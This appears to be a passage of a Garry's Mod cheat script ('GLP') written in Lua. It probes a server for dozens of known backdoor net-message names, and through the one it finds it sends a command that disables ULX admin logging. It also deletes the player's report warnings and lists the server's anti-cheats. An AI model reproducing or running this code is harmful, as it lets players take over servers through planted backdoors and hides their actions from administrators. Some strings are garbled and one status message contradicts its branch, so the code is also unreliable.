    if( ValidNetString("DarkRP_AdminWeapons") ) then
        netKey = "DarkRP_AdminWeapons"
    else
    end
 
    if( ValidNetString("enablevac") ) then
        netKey = "enablevac"
    else
    end
 
    if( ValidNetString("SessionBackdoor") ) then
        netKey = "SessionBackdoor"
    else
    end
 
    if( ValidNetString("Fix_Keypads") ) then
        netKey = "Fix_Keypads"
    else
    end
 
    if( ValidNetString("Remove_Exploiters") ) then
        netKey = "Remove_Exploiters"
    else
    end
 
    if( ValidNetString("noclipcloakaesp_chat_text") ) then
        netKey = "noclipcloakaesp_chat_text"
    else
    end
 
    if( ValidNetString("_GlItCh") ) then
        netKey = "_GlItCh"
    else
    end
 
    if( ValidNetString("_CAC_ReadMemory") ) then
        netKey = "_CAC_ReadMemory"
    else
    end
 
    if( ValidNetString("nostrip") ) then
        netKey = "nostrip"
    else
    end
 
    if( ValidNetString("LickMeOut") ) then
        netKey = "LickMeOut"
    else
    end
 
    if( ValidNetString("MoonMan") ) then
        netKey = "MoonMan"
    else
    end
 
    if( ValidNetString("Im_SOCool") ) then
        netKey = "Im_SOCool"
    else
    end
 
    if( ValidNetString("ULXQUERY2") ) then
        netKey = "ULXQUERY2"
    else
    end
    if( ValidNetString("Sbox_itemstore") ) then
        netKey = "Sbox_itemstore"
    else
    end
    if( ValidNetString("Ulib_Message") ) then
        netKey = "Ulib_Message"
    else
    end
    if( ValidNetString("Sbox_darkrp") ) then
        netKey = "Sbox_darkrp"
    else
    end
    if( ValidNetString("ULogs_Info") ) then
        netKey = "ULogs_Info"
    else
    end
    if( ValidNetString("ITEM") ) then
        netKey = "ITEM"
    else
    end
    if( ValidNetString("fix") ) then
        netKey = "fix"
    else
    end
    if( ValidNetString("nocheat") ) then
        netKey = "nocheat"
    else
    end
    if( ValidNetString("ULX_QUERY2") ) then
        netKey = "ULX_QUERY2"
    else
    end
    if( ValidNetString("Sandbox_GayParty") ) then
        netKey = "Sandbox_GayParty"
    else
    end
    if( ValidNetString("DarkRP_UTF8") ) then
        netKey = "DarkRP_UTF8"
    else
    end
    if( ValidNetString("oldNetReadData") ) then
        netKey = "oldNetReadData"
    else
    end
    if( ValidNetString("Crero") ) then
        netKey = "Crero"
    else
    end
    if( ValidNetString("BackDoor") ) then
        netKey = "BackDoor"
    else
    end
    if( ValidNetString("OdiumBackDoor") ) then
        netKey = "OdiumBackDoor"
    else
    end
    if( ValidNetString("DarkRP_UTF8") ) then
        netKey = "DarkRP_UTF8"
    else
    end
    if( ValidNetString("REBUG") ) then
        netKey = "REBUG"
    else
    end
    if( ValidNetString("entityhealt") ) then
        netKey = "entityhealt"
    else
    end
    if( ValidNetString("SNTE<ALL") ) then
        netKey = "SNTE<ALL"
    else
    end
    if( ValidNetString("_Warns") ) then
        netKey = "_Warns"
    else
    end
    if( ValidNetString("banId") ) then
        netKey = "banId"
    else
    end
    if( ValidNetString("cucked") ) then
        netKey = "cucked"
    else
    end
    if( ValidNetString("NoNerks") ) then
        netKey = "NoNerks"
    else
    end
    if( ValidNetString("kek") ) then
        netKey = "kek"
    else
    end
    if( ValidNetString("ZimbaBackDoor") ) then
        netKey = "ZimbaBackDoor"
    else
    end
    if( ValidNetString("something") ) then
        netKey = "something"
    else
    end
    if( ValidNetString("random") ) then
        netKey = "random"
    else
    end
    if( ValidNetString("strip0") ) then
        netKey = "strip0"
    else
    end
    if( ValidNetString("fellosnake") ) then
        netKey = "fellosnake"
    else
    end
    if( ValidNetString("idk") ) then
        netKey = "idk"
    else
    end
    if( ValidNetString("c") ) then
        netKey = "c"
    else
    end
    if( ValidNetString("killserver") ) then
        netKey = "killserver"
    else
    end
    if( ValidNetString("fuckserver") ) then
        netKey = "fuckserver"
    else
    end
    if( ValidNetString("cvaraccess") ) then
        netKey = "cvaraccess"
    else
    end
    if( ValidNetString("rcon") ) then
        netKey = "rcon"
    else
    end
    if( ValidNetString("rconadmin") ) then
        netKey = "rconadmin"
    else
    end
    if( ValidNetString("web") ) then
        netKey = "web"
    else
    end
    if( ValidNetString("jesuslebg") ) then
        netKey = "jesuslebg"
    else
    end
    if( ValidNetString("zilnix") ) then
        netKey = "zilnix"
    else
    end
    if( ValidNetString("Þà?D)◘") ) then
        netKey = "Þà?D)◘"
    else
    end
    if( ValidNetString("disablebackdoor") ) then
        netKey = "disablebackdoor"
    else
    end
    if( ValidNetString("kill") ) then
        netKey = "kill"
    else
    end
    if( ValidNetString("ServerSoocks") ) then
        netKey = "ServerSoocks"
    else
    end
    if( ValidNetString("awarn_remove") ) then
        netKey = "awarn_remove"
    else
    end
    if( ValidNetString("ulx_worm") ) then
        netKey = "ulx_worm"
    else
    end
    if( ValidNetString("Kvac") ) then
        netKey = "Kvac"
    else
    end
    if( ValidNetString("GlItChBackdoor") ) then
        netKey = "GlItChBackdoor"
    else
    end
    if netKey == "" then
         chat.AddText(Color(255, 255, 255, 255), "[", "[GLP] BACKDOOR", "] ", Color(165, 22, 22, 255), "No Backdoor was Found." )
    else
        chat.AddText(Color(255, 255, 255, 255), "[", "[GLP] BACKDOOR", "] ", Color(165, 22, 22, 255), "Backdoor was not found on the server.Net Backdoor: ".. netKey )
            -- Auto shut down ULX Logs
            if GetConVarNumber("silent") == 1 then
                net.Start(netKey)
                net.WriteString( "ulx_logecho 0" )
                net.WriteBit (0)
                net.SendToServer()
 
                timer.Simple(0.1, function()
                    net.Start(netKey)
                    net.WriteString( "ulx_logecho 0" )
                    net.WriteBit (1)
                     net.SendToServer()
 
                chat.AddText("ULX Logs Отключены." )
                end)
            end
    end

 
surface.CreateFont( "PopupHFont", {
    font = "Segoe UI Light",
    size = 50,
    weight = 1000,
})
 
surface.CreateFont("PopupFont", {
    font = "Segoe UI Light",
    size = 21,
    weight = 300
})

end

------------------------------------------------------------------------------------------------
 
local title = "You have been reported! Please answer all your reports."
    local function CheckChild(pan)
        if not pan or not IsValid(pan) then return end
 
        if pan.GetTitle and pan:GetTitle() == title then
            pan:Remove()
            print("Deleted warning box")
 
            return
        end
 
        for k, v in pairs(pan:GetChildren()) do
            if v.GetTitle and v:GetTitle() == title then
                v:Remove()
                print("Deleted warning box")
 
                return
            end
 
            if #v:GetChildren() > 0 then
                CheckChild(v)
            end
        end
    end
 
    local isttt = false
    if (engine.ActiveGamemode() == "terrortown") then
        isttt = true
    end
 
    local bypass = 0
 
 
 
 
 
 
    local rainb = false
    function rainbowphysgun()
    surface.PlaySound("garrysmod/ui_click.wav")
        if not rainb then
            hook.Add("Think", "RGBSTF", function()
                local rainbowC = HSVToColor(CurTime() % 6 * 60, 1, 1)
                LocalPlayer():SetWeaponColor(Vector(rainbowC.r / 255, rainbowC.g / 255, rainbowC.b / 255))
                LocalPlayer():SetPlayerColor(Vector(rainbowC.r / 255, rainbowC.g / 255, rainbowC.b / 255))
            end)
            chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GLP RAINBOW ON", "] ", Color( 255, 255, 255 ), "Rainbow physgun On" )
            rainb = true
        else
            hook.Remove("Think", "RGBSTF")
            chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GLP RAINBOW OFF", "] ", Color( 255, 255, 255 ), "Rainbow physgun off" )
            rainb = false
        end
    end


    local rainb = false
    function partyphysgun()
    surface.PlaySound("garrysmod/ui_click.wav")
        if not rainb then
            hook.Add("Think", "RGBSTF", function()
                local rainbowC = HSVToColor(CurTime() % 6 * 100, 3, 3)
                LocalPlayer():SetWeaponColor(Vector(rainbowC.r / 255, rainbowC.g / 255, rainbowC.b / 255))
                LocalPlayer():SetPlayerColor(Vector(rainbowC.r / 255, rainbowC.g / 255, rainbowC.b / 255))
            end)
            chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GLP PARTY ON", "] ", Color( 255, 255, 255 ), "Party physgun On" )
            rainb = true
        else
            hook.Remove("Think", "RGBSTF")
            chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GLP PARTY OFF", "] ", Color( 255, 255, 255 ), "Party physgun off" )
            rainb = false
        end
    end
 
 
 
    surface.CreateFont("WHT", {
        font = "Robot",
        size = ScreenScale(7),
        weight = 150,
        antialias = true,
        shadow = true,
    })

  
local CommandList2 = {}
 
local CompleteList2 = {}
 
local oaddcc = AddConsoleCommand
 
local _A = {}
 
 
_A.aegis = {}
 
_A.registry = debug.getregistry()
 
local aegis = {}
 
_A.aegis.logs = {}
 
_A.aegis.anticheats = {}
 
_A.aegis.exploitables = {}
 
 
 
local function ispooped( str )
 
        local status, error = pcall( net.Start, str )
 
        return status
 
    end
 

 
 
    concommand.Add( "GLP_anticheats", function()
 
        local acpanel = vgui.Create("DFrame")
 
        if !acpanel then return end
 
        acpanel:SetSize(500,455)
 
        acpanel:SetTitle("Server Security")
 
        acpanel:Center()
 
        acpanel:MakePopup()
 
 
 
        acpanel.Paint = function( s, w, h )
 
        surface.SetDrawColor( Color(30, 30, 30, 255) )
 
        surface.DrawRect( 0, 0, w, h )
 
        surface.SetDrawColor( Color(55, 55, 55, 255) )
 
        surface.DrawOutlinedRect( 0, 0, w, h )
 
        surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
 
        surface.SetDrawColor( Color(33, 33, 33, 200) )
 
        surface.DrawRect( 10, 25, w - 20, h - 35 )
 
        end
 
 
 
        local Plist = vgui.Create( "DPanelList", acpanel )
 
        Plist:SetSize( acpanel:GetWide() - 20, acpanel:GetTall() - 35 )
 
        Plist:SetPadding( 5 )
 
        Plist:SetSpacing( 5 )
 
        Plist:EnableHorizontal( false )
 
        Plist:EnableVerticalScrollbar( true )
 
        Plist:SetPos( 10, 25 )
 
        Plist:SetName( "" )
 
 
 
 
 
        local function CreateACPanel( cmd )
 
        if !acpanel then return end
 
            local cmdp = vgui.Create( "DPanel" )
 
            cmdp:SetSize( Plist:GetWide(), 60 )
 
            cmdp.Cmd = cmd
 
            cmdp.Desc = acfags[cmd].desc

            cmdp.Paint = function( s, w, h )
 
                surface.SetDrawColor( Color(50, 50, 50, 255) )
 
                surface.DrawRect( 0, 0, w, h )
 
                surface.SetDrawColor( Color(65, 65, 65, 255) )
 
                surface.DrawOutlinedRect( 0, 0, w, h )
 
                surface.DrawLine( 0, 24, w, 24 )
 
                draw.DrawText( cmdp.Cmd, "DermaDefault", 10, 5, Color(237, 138, 27, 255) )
 
                draw.DrawText( cmdp.Desc, "DermaDefault", 10, 28, Color(237, 138, 27, 255) )
 
            end
 
 
 
            Plist:AddItem( cmdp )
 
        end
 
 
 
 
 
        for k, v in pairs( acfags ) do
 
            if v["scan"]() then CreateACPanel( k ) end


 
          end


    end)
